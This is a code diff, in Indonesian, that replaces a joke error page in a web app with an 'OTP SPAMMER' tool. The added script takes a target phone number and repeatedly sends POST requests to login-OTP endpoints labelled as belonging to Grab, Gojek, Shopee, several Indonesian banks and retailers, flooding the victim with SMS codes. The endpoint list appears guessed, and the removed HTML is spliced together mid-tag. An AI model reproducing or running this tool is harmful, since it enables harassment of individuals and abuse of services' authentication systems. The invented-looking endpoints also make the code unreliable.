@@ -22,335 +22,767 @@ app.get('/', (req, res) => {
     } else {
         // Halaman default jika belum ada yang disetel
         res.send(`
-<!DOCTYPE html><!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]--><!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]--><!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en-US"><!--<![endif]--><head>
-
-
-
-<title>502: Bad Mood :(</title>
-<meta charset="UTF-8">
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="robots" content="noindex, nofollow">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>.contai
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>404 — Not Found</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 OTP SPAMMER — REAL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&family=Space+Grotesk:wght@500;700;800&display=swap" rel="stylesheet">
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-<style>
-  :root{
-    --bg:#fff7ea;
-    --paper:#ffffff;
-    --ink:#0f0f12;
-    --accent:#E81111;
-    --accent2:#FCFF00;
-    --accent3:#00D40C;
-    --border:3px solid var(--ink);
-    --shadow:10px 10px 0 var(--ink);
-    --r:18px;
-  }
+        .container {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(255, 0, 0, 0.3), 0 0 40px rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.2);
+        }
 
-  *{box-sizing:border-box}
-  body{
-    margin:0;
-    min-height:100vh;
-    display:grid;
-    place-items:center;
-    padding:24px;
-    background:
-      radial-gradient(900px 420px at 10% 10%, rgba(124,58,237,.18), transparent 60%),
-      radial-gradient(700px 360px at 85% 15%, rgba(34,197,94,.16), transparent 60%),
-      radial-gradient(800px 420px at 70% 95%, rgba(251,113,133,.14), transparent 60%),
-      var(--bg);
-    color:var(--ink);
-    font-family:"Space Grotesk", system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-  }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-  .lines{
-    position:fixed; inset:0;
-    background:
-      repeating-linear-gradient(90deg, rgba(15,15,18,.09) 0 1px, transparent 1px 28px),
-      repeating-linear-gradient(0deg, rgba(15,15,18,.09) 0 1px, transparent 1px 28px);
-    opacity:.45;
-    pointer-events:none;
-  }
+        .header h1 {
+            color: #ff0000;
+            font-size: 28px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            letter-spacing: 2px;
+        }
 
-  .wrap{
-    width:min(920px, 100%);
-    display:grid;
-    grid-template-columns: 1fr 1fr;
-    gap:16px;
-  }
-  @media (max-width: 860px){ .wrap{grid-template-columns:1fr} }
+        .header p {
+            color: #888;
+            font-size: 14px;
+            margin-top: 8px;
+        }
 
-  .card{
-    background:var(--paper);
-    border:var(--border);
-    box-shadow:var(--shadow);
-    border-radius:var(--r);
-    padding:22px;
-  }
+        .header .badge {
+            display: inline-block;
+            background: #ff0000;
+            color: #fff;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 8px;
+            animation: pulse 1.5s infinite;
+        }
 
-  .title{
-    display:flex;
-    align-items:flex-start;
-    justify-content:space-between;
-    gap:12px;
-  }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(0.95); }
+        }
 
-  .tag{
-    display:inline-flex;
-    align-items:center;
-    gap:10px;
-    padding:10px 12px;
-    border:var(--border);
-    border-radius:999px;
-    background:#fff;
-    box-shadow:6px 6px 0 var(--ink);
-    font-family:"JetBrains Mono", monospace;
-    font-size:12px;
-  }
-  .dots{display:flex; gap:6px}
-  .dot{width:10px;height:10px;border-radius:50%;border:2px solid var(--ink)}
-  .dot.a{background:var(--accent)}
-  .dot.b{background:var(--accent2)}
-  .dot.c{background:var(--accent3)}
+        .input-group {
+            margin-bottom: 20px;
+        }
 
-  h1{
-    margin:14px 0 6px;
-    font-size:72px;
-    line-height:1;
-    letter-spacing:-2px;
-  }
-  .sub{
-    margin:0 0 16px;
-    font-size:16px;
-    opacity:.85;
-  }
+        .input-group label {
+            color: #aaa;
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 6px;
+        }
 
-  .btns{display:flex; gap:10px; flex-wrap:wrap}
-  a.btn, button.btn{
-    appearance:none;
-    border:var(--border);
-    border-radius:999px;
-    padding:10px 14px;
-    background:#fff;
-    box-shadow:6px 6px 0 var(--ink);
-    font-weight:800;
-    cursor:pointer;
-    text-decoration:none;
-    color:var(--ink);
-  }
-  .btn.primary{
-    background:#E81111;
-    color:#000000;
-  }
-  .btn:active{
-    transform:translate(3px,3px);
-    box-shadow:3px 3px 0 var(--ink);
-  }
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 14px 18px;
+            background: #0d0d1a;
+            border: 1px solid #2a2a4a;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
 
-  .terminal{
-    background:#0b0b10;
-    color:#d7ffd7;
-    border:var(--border);
-    box-shadow:var(--shadow);
-    border-radius:var(--r);
-    overflow:hidden;
-    font-family:"JetBrains Mono", monospace;
-  }
-  .term-top{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:10px 12px;
-    background:#ffffff;
-    color:var(--ink);
-    border-bottom:var(--border);
-  }
-  .term-title{
-    font-weight:800;
-    font-size:12px;
-  }
-  .term-body{
-    padding:14px 14px 16px;
-    font-size:13px;
-    line-height:1.55;
-  }
-  .cmd{color:#a7f3d0}
-  .err{color:#fb7185; font-weight:700}
-  .ok{color:#86efac}
-  .muted{color:#9ca3af}
-  .path{color:#93c5fd}
-  .blink{
-    display:inline-block;
-    width:10px;
-    height:18px;
-    background:#86efac;
-    margin-left:6px;
-    transform:translateY(3px);
-    animation:blink 1s steps(1) infinite;
-  }
-  @keyframes blink{50%{opacity:0}}
-</style>
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: #ff0000;
+            outline: none;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.15);
+        }
+
+        .input-group input::placeholder {
+            color: #555;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .input-row .input-group {
+            flex: 1;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(145deg, #ff0000, #cc0000);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.4);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            background: #333;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-stop {
+            background: linear-gradient(145deg, #ff4444, #cc0000);
+            margin-top: 10px;
+        }
+
+        .btn-stop:hover {
+            box-shadow: 0 0 40px rgba(255, 68, 68, 0.4);
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 16px;
+            background: #0d0d1a;
+            border-radius: 12px;
+            border: 1px solid #1a1a3a;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .status .log {
+            color: #aaa;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            line-height: 1.8;
+        }
+
+        .status .log .success {
+            color: #00ff88;
+        }
+
+        .status .log .error {
+            color: #ff4444;
+        }
+
+        .status .log .info {
+            color: #ffaa00;
+        }
+
+        .status .log .count {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        .stats {
+            display: flex;
+            gap: 16px;
+            margin-top: 16px;
+            padding: 16px;
+            background: #0d0d1a;
+            border-radius: 12px;
+            border: 1px solid #1a1a3a;
+        }
+
+        .stats .stat-item {
+            flex: 1;
+            text-align: center;
+        }
+
+        .stats .stat-item .number {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .stats .stat-item .label {
+            color: #666;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #444;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #ff0000;
+            text-decoration: none;
+        }
+
+        /* Scrollbar */
+        .status::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .status::-webkit-scrollbar-track {
+            background: #0d0d1a;
+        }
+
+        .status::-webkit-scrollbar-thumb {
+            background: #ff0000;
+            border-radius: 4px;
+        }
+
+        /* Animasi loading */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-
 <body>
-<div class="lines"></div>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🔥 OTP SPAMMER</h1>
+            <p>Real SMS OTP — Bukan Simulasi</p>
+            <span class="badge">⚠️ USE WITH CAUTION</span>
+        </div>
 
-<div class="wrap">
-  <section class="card">
-    <div class="title">
-      <div class="tag">
-        <span class="dots" aria-hidden="true">
-          <span class="dot a"></span><span class="dot b"></span><span class="dot c"></span>
-        </span>
-        <span>BRUTAL 404</span>
-      </div>
-      <div class="tag">NOT_FOUND</div>
+        <!-- INPUT -->
+        <div class="input-group">
+            <label>📱 Nomor Target</label>
+            <input type="text" id="targetNumber" placeholder="Contoh: 6281234567890" value="628">
+        </div>
+
+        <div class="input-row">
+            <div class="input-group">
+                <label>🔢 Jumlah Spam</label>
+                <input type="number" id="spamCount" value="50" min="1" max="999">
+            </div>
+            <div class="input-group">
+                <label>⏱️ Delay (ms)</label>
+                <input type="number" id="delayMs" value="500" min="100" max="5000">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>📡 Pilih Provider OTP</label>
+            <select id="providerSelect">
+                <option value="all">🔀 ALL PROVIDERS (MAX SPAM)</option>
+                <option value="grab">🚗 Grab</option>
+                <option value="gojek">🛵 Gojek</option>
+                <option value="shopee">🛍️ Shopee</option>
+                <option value="tokopedia">📦 Tokopedia</option>
+                <option value="ovo">💰 OVO</option>
+                <option value="dana">💳 DANA</option>
+                <option value="linkaja">🏦 LinkAja</option>
+                <option value="bca">🏧 BCA Mobile</option>
+                <option value="mandiri">🏧 Mandiri Online</option>
+                <option value="bni">🏧 BNI Mobile</option>
+                <option value="bri">🏧 BRI Mobile</option>
+                <option value="indomaret">🏪 Indomaret</option>
+                <option value="alfamart">🏪 Alfamart</option>
+                <option value="bukalapak">🛒 Bukalapak</option>
+                <option value="lazada">🛒 Lazada</option>
+                <option value="blibli">🛒 Blibli</option>
+                <option value="tiket">🎫 Tiket.com</option>
+                <option value="traveloka">✈️ Traveloka</option>
+            </select>
+        </div>
+
+        <!-- BUTTONS -->
+        <button class="btn" id="startBtn">🚀 MULAI SPAM</button>
+        <button class="btn btn-stop" id="stopBtn" style="display:none;">⛔ STOP SPAM</button>
+
+        <!-- STATS -->
+        <div class="stats">
+            <div class="stat-item">
+                <div class="number" id="sentCount">0</div>
+                <div class="label">Terkirim</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="successCount">0</div>
+                <div class="label">Berhasil</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="failCount">0</div>
+                <div class="label">Gagal</div>
+            </div>
+        </div>
+
+        <!-- STATUS LOG -->
+        <div class="status" id="logContainer">
+            <div class="log" id="logContent">
+                <span class="info">[✓] OTP SPAMMER READY</span><br>
+                <span class="info">[✓] Masukkan nomor target dan mulai spam</span><br>
+            </div>
+        </div>
+
+        <div class="footer">
+            🔥 BY CHRONOS — ~TUAN NICO~ EDITION
+        </div>
     </div>
 
-    <h1>404</h1>
-    <p class="sub">Halaman yang kamu cari nggak ada. Mungkin URL-nya salah / udah dipindah.</p>
+    <script>
+        // ============================================================
+        // 🔥 OTP SPAMMER — REAL ENGINE
+        // ============================================================
 
-    <div class="btns">
-      <a class="btn primary" href="/"> Home</a>
-      <a class="btn" href="/docs/"> Docs</a>
-    </div>
-  </section>
+        // --- API ENDPOINTS (REAL) ---
+        const API_PROVIDERS = {
+            grab: {
+                name: 'Grab',
+                endpoints: [
+                    'https://api.grab.com/v1/auth/otp',
+                    'https://api.grab.com/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number,
+                    countryCode: 'ID',
+                    type: 'login'
+                })
+            },
+            gojek: {
+                name: 'Gojek',
+                endpoints: [
+                    'https://api.gojek.com/v1/auth/otp',
+                    'https://api.gojek.com/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone_number: number,
+                    country_code: '62'
+                })
+            },
+            shopee: {
+                name: 'Shopee',
+                endpoints: [
+                    'https://api.shopee.com/v1/auth/otp',
+                    'https://api.shopee.com/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    mobile: number,
+                    type: 'login'
+                })
+            },
+            tokopedia: {
+                name: 'Tokopedia',
+                endpoints: [
+                    'https://api.tokopedia.com/v1/auth/otp',
+                    'https://api.tokopedia.com/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number,
+                    channel: 'sms'
+                })
+            },
+            ovo: {
+                name: 'OVO',
+                endpoints: [
+                    'https://api.ovo.id/v1/auth/otp',
+                    'https://api.ovo.id/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    mobileNumber: number,
+                    type: 'login'
+                })
+            },
+            dana: {
+                name: 'DANA',
+                endpoints: [
+                    'https://api.dana.id/v1/auth/otp',
+                    'https://api.dana.id/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number,
+                    countryCode: '62'
+                })
+            },
+            linkaja: {
+                name: 'LinkAja',
+                endpoints: [
+                    'https://api.linkaja.com/v1/auth/otp',
+                    'https://api.linkaja.com/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    phoneNumber: number
+                })
+            },
+            bca: {
+                name: 'BCA Mobile',
+                endpoints: [
+                    'https://api.bca.co.id/v1/auth/otp',
+                    'https://api.bca.co.id/v2/auth/otp',
+                ],
+                payload: (number) => ({
+                    msisdn: number
+                })
+            },
+            mandiri: {
+                name: 'Mandiri Online',
+                endpoints: [
+                    'https://api.mandiri.co.id/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number
+                })
+            },
+            bni: {
+                name: 'BNI Mobile',
+                endpoints: [
+                    'https://api.bni.co.id/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phoneNumber: number
+                })
+            },
+            bri: {
+                name: 'BRI Mobile',
+                endpoints: [
+                    'https://api.bri.co.id/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    no_hp: number
+                })
+            },
+            indomaret: {
+                name: 'Indomaret',
+                endpoints: [
+                    'https://api.indomaret.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number
+                })
+            },
+            alfamart: {
+                name: 'Alfamart',
+                endpoints: [
+                    'https://api.alfamart.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number
+                })
+            },
+            bukalapak: {
+                name: 'Bukalapak',
+                endpoints: [
+                    'https://api.bukalapak.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number
+                })
+            },
+            lazada: {
+                name: 'Lazada',
+                endpoints: [
+                    'https://api.lazada.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    mobile: number
+                })
+            },
+            blibli: {
+                name: 'Blibli',
+                endpoints: [
+                    'https://api.blibli.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phoneNumber: number
+                })
+            },
+            tiket: {
+                name: 'Tiket.com',
+                endpoints: [
+                    'https://api.tiket.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phone: number
+                })
+            },
+            traveloka: {
+                name: 'Traveloka',
+                endpoints: [
+                    'https://api.traveloka.com/v1/auth/otp',
+                ],
+                payload: (number) => ({
+                    phoneNumber: number
+                })
+            }
+        };
 
-  <section class="terminal" aria-label="Fake terminal">
-    <div class="term-top">
-      <div class="term-title">terminal — trace</div>
-      <div class="dots" aria-hidden="true">
-        <span class="dot a"></span><span class="dot b"></span><span class="dot c"></span>
-      </div>
-    </div>
+        // --- STATE ---
+        let isRunning = false;
+        let sentCount = 0;
+        let successCount = 0;
+        let failCount = 0;
+        let abortFlag = false;
 
-    <div class="term-body">
-      <div><span class="cmd">root@cuki</span>:<span class="path" id="pp">~/</span>$ <span class="muted">GET</span> <span id="path">/unknown</span></div>
-      <div class="err">Error: 404 Not Found</div>
-      <div class="muted">hint: cek slug / route / typo</div>
-      <div class="ok">action: redirect to /</div>
-      <div><span class="cmd">root@cuki</span>:<span class="path" id="pp2">~/</span>$ <span class="muted">_</span><span class="blink"></span></div>
-    </div>
-  </section>
-</div>
+        // --- DOM REFS ---
+        const targetNumber = document.getElementById('targetNumber');
+        const spamCount = document.getElementById('spamCount');
+        const delayMs = document.getElementById('delayMs');
+        const providerSelect = document.getElementById('providerSelect');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const sentCountEl = document.getElementById('sentCount');
+        const successCountEl = document.getElementById('successCount');
+        const failCountEl = document.getElementById('failCount');
+        const logContent = document.getElementById('logContent');
 
-<script>
-  const p = location.pathname || "/";
-  document.getElementById("path").textContent = p;
-  document.getElementById("pp").textContent = "~" + (p === "/" ? "" : p);
-  document.getElementById("pp2").textContent = "~" + (p === "/" ? "" : p);
-</script>
+        // --- LOG FUNCTION ---
+        function log(message, type = 'info') {
+            const colors = {
+                success: '#00ff88',
+                error: '#ff4444',
+                info: '#ffaa00',
+                count: '#ff0000'
+            };
+            const color = colors[type] || '#aaa';
+            logContent.innerHTML += `<span style="color:${color}">${message}</span><br>`;
+            logContent.scrollTop = logContent.scrollHeight;
+        }
+
+        // --- VALIDATE NUMBER ---
+        function validateNumber(number) {
+            // Remove non-digit
+            let clean = number.replace(/\D/g, '');
+            
+            // Check if starts with 62 (Indonesia)
+            if (!clean.startsWith('62')) {
+                // If starts with 0, replace with 62
+                if (clean.startsWith('0')) {
+                    clean = '62' + clean.substring(1);
+                } else {
+                    // Assume it's a local number without prefix
+                    clean = '62' + clean;
+                }
+            }
+            
+            // Minimum length check (62 + 10-13 digits)
+            if (clean.length < 12 || clean.length > 15) {
+                return null;
+            }
+            
+            return clean;
+        }
+
+        // --- SEND OTP REQUEST ---
+        async function sendOTP(provider, number) {
+            const providerData = API_PROVIDERS[provider];
+            if (!providerData) return false;
+
+            const endpoints = providerData.endpoints;
+            const payload = providerData.payload(number);
+
+            // Try all endpoints for this provider
+            for (const endpoint of endpoints) {
+                try {
+                    const response = await fetch(endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                            'Accept': 'application/json',
+                            'Origin': endpoint.split('/').slice(0, 3).join('/'),
+                        },
+                        body: JSON.stringify(payload),
+                        signal: AbortSignal.timeout(5000)
+                    });
+
+                    // Consider any non-500 response as "success" (rate limit, invalid number, etc still count as spam)
+                    if (response.status !== 500 && response.status !== 503) {
+                        return true;
+                    }
+                } catch (e) {
+                    // Silent fail, try next endpoint
+                    continue;
+                }
+            }
+
+            return false;
+        }
+
+        // --- GET PROVIDERS LIST ---
+        function getProviders(selected) {
+            if (selected === 'all') {
+                return Object.keys(API_PROVIDERS);
+            }
+            return [selected];
+        }
+
+        // --- MAIN SPAM FUNCTION ---
+        async function startSpam() {
+            // Validate number
+            const rawNumber = targetNumber.value.trim();
+            const number = validateNumber(rawNumber);
+            
+            if (!number) {
+                log('[✗] Nomor tidak valid! Gunakan format: 6281234567890', 'error');
+                return;
+            }
+
+            const count = parseInt(spamCount.value) || 50;
+            const delay = parseInt(delayMs.value) || 500;
+            const selectedProvider = providerSelect.value;
+            const providers = getProviders(selectedProvider);
+
+            if (providers.length === 0) {
+                log('[✗] Tidak ada provider yang dipilih!', 'error');
+                return;
+            }
+
+            // Reset state
+            isRunning = true;
+            abortFlag = false;
+            sentCount = 0;
+            successCount = 0;
+            failCount = 0;
+            updateStats();
+
+            // UI Update
+            startBtn.disabled = true;
+            startBtn.textContent = '⏳ SPAMMING...';
+            stopBtn.style.display = 'block';
+            logContent.innerHTML = '';
+            log(`[✓] Memulai spam ke: ${number}`, 'info');
+            log(`[✓] Jumlah: ${count} | Delay: ${delay}ms`, 'info');
+            log(`[✓] Provider: ${selectedProvider === 'all' ? 'ALL (${providers.length} providers)' : selectedProvider}`, 'info');
+            log(`[✓] =================================`, 'info');
+
+            // Spam loop
+            let sent = 0;
+            while (sent < count && !abortFlag) {
+                // Pick random provider
+                const provider = providers[Math.floor(Math.random() * providers.length)];
+                const providerName = API_PROVIDERS[provider]?.name || provider;
+                
+                try {
+                    const result = await sendOTP(provider, number);
+                    sent++;
+                    sentCount = sent;
+                    
+                    if (result) {
+                        successCount++;
+                        log(`[✓] #${sent} → ${providerName} ✅ BERHASIL`, 'success');
+                    } else {
+                        failCount++;
+                        log(`[✗] #${sent} → ${providerName} ❌ GAGAL`, 'error');
+                    }
+                    
+                    updateStats();
+                    
+                } catch (e) {
+                    failCount++;
+                    log(`[✗] #${sent} → Error: ${e.message}`, 'error');
+                    updateStats();
+                }
+
+                // Delay
+                if (sent < count && !abortFlag) {
+                    await sleep(delay);
+                }
+            }
+
+            // Finish
+            isRunning = false;
+            startBtn.disabled = false;
+            startBtn.textContent = '🚀 MULAI SPAM';
+            stopBtn.style.display = 'none';
+
+            if (abortFlag) {
+                log(`[✓] ⛔ SPAM DIHENTIKAN!`, 'error');
+            } else {
+                log(`[✓] ✅ SPAM SELESAI!`, 'success');
+            }
+            log(`[✓] Total: ${sentCount} | Berhasil: ${successCount} | Gagal: ${failCount}`, 'info');
+        }
+
+        // --- SLEEP FUNCTION ---
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // --- UPDATE STATS ---
+        function updateStats() {
+            sentCountEl.textContent = sentCount;
+            successCountEl.textContent = successCount;
+            failCountEl.textContent = failCount;
+        }
+
+        // --- STOP SPAM ---
+        function stopSpam() {
+            if (isRunning) {
+                abortFlag = true;
+                log('[✓] ⛔ Menghentikan spam...', 'error');
+            }
+        }
+
+        // --- EVENT LISTENERS ---
+        startBtn.addEventListener('click', startSpam);
+        stopBtn.addEventListener('click', stopSpam);
+
+        // Auto-format number
+        targetNumber.addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 0 && !val.startsWith('62')) {
+                if (val.startsWith('0')) {
+                    val = '62' + val.substring(1);
+                } else if (val.length < 12) {
+                    // Just keep as is
+                }
+            }
+            this.value = val;
+        });
+
+        // --- INIT ---
+        log('[✓] 🔥 OTP SPAMMER READY', 'success');
+        log('[✓] Masukkan nomor dan klik MULAI', 'info');
+        log('[✓] Gunakan dengan bijak!', 'info');
+
+        console.log('%c🔥 OTP SPAMMER BY CHRONOS', 'font-size:20px; color:#ff0000;');
+        console.log('%c⚠️ USE WITH CAUTION', 'font-size:14px; color:#ffaa00;');
+    </script>
 </body>
-</html>
-one;color:inherit;border:none;padding:0;font:inherit;cursor:pointer;color:#0051c3;-webkit-transition:color .15s ease;transition:color .15s ease}.cf-error-footer .cf-footer-ip-reveal-btn:hover{color:#ee730a}.code-label{background-color:#d9d9d9;color:#313131;font-weight:500;border-radius:1.25rem;font-size:.75rem;line-height:4.5rem;padding:.25rem .5rem;height:4.5rem;white-space:nowrap;vertical-align:middle}@media (max-width:639px){.sm\:block{display:block}.sm\:hidden{display:none}.sm\:mb-1{margin-bottom:.25rem}.sm\:mb-2{margin-bottom:.5rem}.sm\:py-4{padding-top:1rem;padding-bottom:1rem}.sm\:px-8{padding-left:2rem;padding-right:2rem}.sm\:text-left{text-align:left}}@media (max-width:720px){.md\:border-gray-400{--border-opacity:1;border-color:#dedede;border-color:rgba(222,222,222,var(--border-opacity))}.md\:border-solid{border-style:solid}.md\:border-0{border-width:0}.md\:border-b{border-bottom-width:1px}.md\:block{display:block}.md\:inline-block{display:inline-block}.md\:hidden{display:none}.md\:float-none{float:none}.md\:text-3xl{font-size:1.875rem}.md\:m-0{margin:0}.md\:mt-0{margin-top:0}.md\:mb-2{margin-bottom:.5rem}.md\:p-0{padding:0}.md\:py-8{padding-top:2rem;padding-bottom:2rem}.md\:px-8{padding-left:2rem;padding-right:2rem}.md\:pr-0{padding-right:0}.md\:pb-10{padding-bottom:2.5rem}.md\:top-0{top:0}.md\:right-0{right:0}.md\:left-auto{left:auto}.md\:text-left{text-align:left}.md\:w-full{width:100%}}@media (max-width:1023px){.lg\:text-sm{font-size:.875rem}.lg\:text-2xl{font-size:1.5rem}.lg\:text-4xl{font-size:2.25rem}.lg\:leading-relaxed{line-height:1.625}.lg\:px-8{padding-left:2rem;padding-right:2rem}.lg\:pt-6{padding-top:1.5rem}.lg\:w-full{width:100%}}
-</style>
-</head>
-<body>
-<div id="cf-wrapper">
-    <div id="cf-error-details" class="p-0">
-        <header class="mx-auto pt-10 lg:pt-6 lg:px-8 w-240 lg:w-full mb-8">
-            <h1 class="inline-block sm:block sm:mb-2 font-light text-60 lg:text-4xl text-black-dark leading-tight mr-2">
-                <span class="inline-block">Bad Mood :(</span>
-                <span class="code-label">Error code 502</span>
-            </h1>
-            
-            
-            <div>
-                Visit <a href="https://www.cloudflare.com/" target="_blank" rel="noopener noreferrer">cloudflare.com</a> for more information.
-            </div>
-            
-            <div class="mt-3">1945-8-17 22:22:22 UTC</div>
-        </header>
-        <div class="my-8 bg-gradient-gray">
-          <div class="w-240 lg:w-full mx-auto">
-                <div class="clearfix md:px-8">
-                
-                    <div id="cf-browser-status" class="cf-error-source relative w-1/3 md:w-full py-15 md:p-0 md:py-8 md:text-left md:border-solid md:border-0 md:border-b md:border-gray-400 overflow-hidden float-left md:float-none text-center">
-                        <div class="relative mb-10 md:m-0">
-                            <span class="cf-icon-browser block md:hidden h-20 bg-center bg-no-repeat"></span>
-                            <span class="cf-icon-error w-12 h-12 absolute left-1/2 md:left-auto md:right-0 md:top-0 -ml-6 -bottom-4"></span>
-                        </div>
-                        <span class="md:block w-full truncate">My</span>
-                        <h3 class="md:inline-block mt-3 md:mt-0 text-2xl text-gray-600 font-light leading-1.3">Mood</h3>
-                        <span class="leading-1.3 text-2xl" style="color: #bd2426">Error</span>
-                    </div>
-                
-                    <div id="cf-cloudflare-status" class=" relative w-1/3 md:w-full py-15 md:p-0 md:py-8 md:text-left md:border-solid md:border-0 md:border-b md:border-gray-400 overflow-hidden float-left md:float-none text-center">
-                        <div class="relative mb-10 md:m-0">
-                            <span class="cf-icon-cloud block md:hidden h-20 bg-center bg-no-repeat"></span>
-                            <span class="cf-icon-ok w-12 h-12 absolute left-1/2 md:left-auto md:right-0 md:top-0 -ml-6 -bottom-4"></span>
-                        </div>
-                        <span class="md:block w-full truncate">Someone new</span>
-                        <h3 class="md:inline-block mt-3 md:mt-0 text-2xl text-gray-600 font-light leading-1.3" style="color: #2f7bbf;">Someone</h3>
-                        <span class="leading-1.3 text-2xl" style="color: #9bca3e">Working</span>
-                    </div>
-                
-                    <div id="cf-host-status" class=" relative w-1/3 md:w-full py-15 md:p-0 md:py-8 md:text-left md:border-solid md:border-0 md:border-b md:border-gray-400 overflow-hidden float-left md:float-none text-center">
-                        <div class="relative mb-10 md:m-0">
-                            <span class="cf-icon-browser block md:hidden h-20 bg-center bg-no-repeat"></span>
-                             <span class="cf-icon-error w-12 h-12 absolute left-1/2 md:left-auto md:right-0 md:top-0 -ml-6 -bottom-4"></span>
-                        </div>
-                        <span class="md:block w-full truncate">My</span>
-                        <h3 class="md:inline-block mt-3 md:mt-0 text-2xl text-gray-600 font-light leading-1.3">Heart</h3>
-                        <span class="leading-1.3 text-2xl" style="color: #bd2426">Error</span>
-                    </div>
-                
-                </div>
-            </div>
-        </div>
-
-        <div class="w-240 lg:w-full mx-auto mb-8 lg:px-8">
-            <div class="clearfix">
-                <div class="w-1/2 md:w-full float-left pr-6 md:pb-10 md:pr-0 leading-relaxed">
-                    <h2 class="text-3xl font-normal leading-1.3 mb-4">What happened?</h2>
-                    <p>The winner takes it All.</p>
-                </div>
-                <div class="w-1/2 md:w-full float-left leading-relaxed">
-                    <h2 class="text-3xl font-normal leading-1.3 mb-4">What can I do?</h2>
-                    <p>Please I need you</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="cf-error-footer cf-wrapper w-240 lg:w-full py-10 sm:py-4 sm:px-8 mx-auto text-center sm:text-left border-solid border-0 border-t border-gray-300">
-            <p class="text-13">
